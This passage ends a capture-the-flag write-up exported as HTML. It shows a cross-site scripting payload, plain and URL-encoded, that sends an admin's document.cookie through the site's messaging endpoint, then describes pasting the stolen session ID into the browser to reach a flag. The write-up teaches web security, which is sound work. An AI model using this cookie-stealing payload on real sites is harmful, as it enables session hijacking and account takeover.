+xhr.send(`receiver=141&amp;subject=FUCK+LEETCODE+-+WE+DOIN+YEETCODE&amp;contents=${document.cookie}`);</code></pre><p id="aa75615e-ce76-4eb0-a484-cb9455c47647" class="">Encoded:</p><pre id="4f1ecd8d-4da2-426e-bcfb-16adaed039ae" class="code"><code>https://obxssession.hackthe.space/error?m=theoryprivate&amp;p=&lt;%73%63%72%69%70%74&gt;var%20xhr%20%3D%20new%20XMLHttpRequest();xhr.open(&quot;POST&quot;,%20&quot;https://obxssession.hackthe.space/send&quot;,%20true);xhr.setRequestHeader(&#x27;Content-Type&#x27;,%20&#x27;application/x-www-form-urlencoded&#x27;);xhr.send(`receiver%3D141%26subject%3DFUCK+LEETCODE+-+WE+DOIN+YEETCODE%26contents%3D${document.cookie}`);&lt;/%73%63%72%69%70%74&gt;</code></pre><p id="b6e0b072-520d-4f75-adf3-0b5976f2c3b8" class="">Then we recieved the admins sessionId in our inbox.</p><p id="a0960599-cc19-45e9-8866-5bfe4462d475" class="">
+</p><h3 id="c8d37abd-958f-4897-833f-cd9b9cf39aaf" class="">Step 3</h3><p id="52338134-29b6-44b1-b5e8-2e2c1232a672" class="">We then put that sessionId into our browser (under chrome dev tools → application → cookies) after logging in.</p><p id="9d4a11d8-5be8-4fce-ab7e-ad43a827abb5" class="">Then we were able to access the <code>profiles</code> page in which there was the flag!</p><p id="4928a54b-0cb7-4e02-9ab6-555d19ac3066" class=""><code>WUT{c47ch1ng_f14g5_on_7h3_m00n}</code></p><p id="2bed27db-b69d-43ea-ad1e-f59d89fa8716" class="">
+</p><h2 id="bf66b6cd-bcf4-45c7-9bfe-acdbb62a3956" class="">Solution</h2><p id="32656d62-7d0b-473b-b891-71bfffe988eb" class="">Sanitize User Input. Always.</p><p id="ed796475-9f6d-4d8b-bd58-09655d3a6abd" class="">
+</p></div></article></body></html>
